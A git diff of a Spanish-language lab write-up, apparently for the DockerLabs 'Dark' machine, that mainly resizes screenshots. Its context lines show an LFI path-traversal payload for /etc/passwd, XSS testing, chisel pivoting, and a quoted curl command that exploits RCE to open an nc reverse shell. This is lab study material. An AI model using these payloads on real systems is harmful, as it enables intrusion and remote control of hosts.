@@ -8,7 +8,6 @@ tags: []
 media_subpath: "/assets/img/posts/dockerlabs_dark"
 image:
   path: main.webp
-published: false
 ---
 
 Para desplegar las máquinas, se haría de la siguiente manera:
@@ -77,7 +76,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Comenzamos revisando la página web alojada en la máquina A, donde vemos un formulario con un campo que acepta URLs:
 
-![Desktop View](/20260128170417.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128170417.webp){: width="450" height="210" .shadow}
 
 Siendo este el caso, lo que podemos hacer es desplegar un servidor local, y hacer pruebas con ficheros de nuestro equipo:
 
@@ -89,7 +88,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Probamos a ver si nos manda peticiones:
 
-![Desktop View](/20260128171014.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128171014.webp){: width="450" height="210" .shadow}
 
 Vemos que efectivamente recibimos las peticiones que hace la máquina A:
 
@@ -111,7 +110,7 @@ Siendo este el caso, creamos un fichero `index.html` e indicamos código en HTML
 
 Y resulta ser que sí:
 
-![Desktop View](/20260128171308.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128171308.webp){: width="450" height="210" .shadow}
 
 De la misma manera, si interpreta HTML, también podría ser vulnerable a XSS:
 
@@ -129,7 +128,7 @@ De la misma manera, si interpreta HTML, también podría ser vulnerable a XSS:
 
 Y confirmamos que así es:
 
-![Desktop View](/20260128172423.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128172423.webp){: width="600" height="420" .shadow}
 
 Probamos a ver si el formulario es vulnerable a un **LFI** (Local File Inclusion, cargar ficheros del sistema) empleando un **Directory Path Traversal** (moverse lateralmente en el sistema antes de cargar un fichero):
 
@@ -137,7 +136,7 @@ Probamos a ver si el formulario es vulnerable a un **LFI** (Local File Inclusion
 ../../../../../../../etc/passwd
 ```
 
-![Desktop View](/20260128192558.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128192558.webp){: width="450" height="210" .shadow}
 
 Vemos que logramos cargar el fichero `/etc/passwd` del sistema:
 
@@ -397,11 +396,11 @@ Crearemos un nuevo perfil para el proxy que se abre con **chisel**:
 
 Una vez configurado, seleccionamos el perfil que acabamos de crear:
 
-![Desktop View](/20260128231924.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128231924.webp){: width="550" height="290" .shadow}
 
 Si ahora accedemos a la máquina B, veremos que nos carga la página:
 
-![Desktop View](/20260128231901.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128231901.webp){: width="450" height="210" .shadow}
 
 En el fichero `.bash_history` de la máquina A encontramos una serie de comandos que explota un **RCE** (Remote Code Execution) para obtener una consola:
 
@@ -415,7 +414,7 @@ curl --data "cmd=nc -e /bin/bash 20.20.20.2 53" http://20.20.20.3/process.php
 
 Accedemos a la página web de la máquina B, indicamos un comando en el campo del formulario y probamos a ver si es verdad que podemos ejecutar comandos:
 
-![Desktop View](/20260128232442.webp){: width="972" height="589" .shadow}
+![Desktop View](/20260128232442.webp){: width="450" height="210" .shadow}
 
 Y vemos que efectivamente podemos ejecutar comandos:
 
